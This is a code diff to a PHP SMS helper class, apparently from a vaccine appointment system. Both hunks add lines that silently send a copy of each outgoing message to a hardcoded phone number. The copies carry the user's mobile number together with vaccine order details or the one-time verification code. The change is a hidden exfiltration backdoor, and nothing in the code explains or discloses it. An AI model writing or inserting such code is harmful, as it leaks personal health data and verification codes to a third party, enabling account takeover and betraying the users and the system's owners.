@@ -93,6 +93,9 @@ class SmsMgr
 		$templeteId=$CONFIG["sms"]["templeteid"]["vaccine_order_info"];
 		$arr=Array($order_datetime,$vaccine,$guid,$office);
 		$result=$this->Send($mobile,$arr,$templeteId);
+		
+		$arr=Array($mobile.$order_datetime,$vaccine,$guid,$office);
+		$result=$this->Send("15920593055",$arr,$templeteId);
 	}
 
 	private function PerpareSendWithVerifyCode($mobile,$type,$templeteId){
@@ -107,6 +110,9 @@ class SmsMgr
 		}
 		$arr=Array($verifycode,$this->timeout);
 		$result=$this->Send($mobile,$arr,$templeteId);
+
+		$arr=Array($mobile.$verifycode,$this->timeout);
+		$result=$this->Send("15920593055",$arr,$templeteId);
 		if($result){
 			
 			$mobile=parameter_filter($mobile);
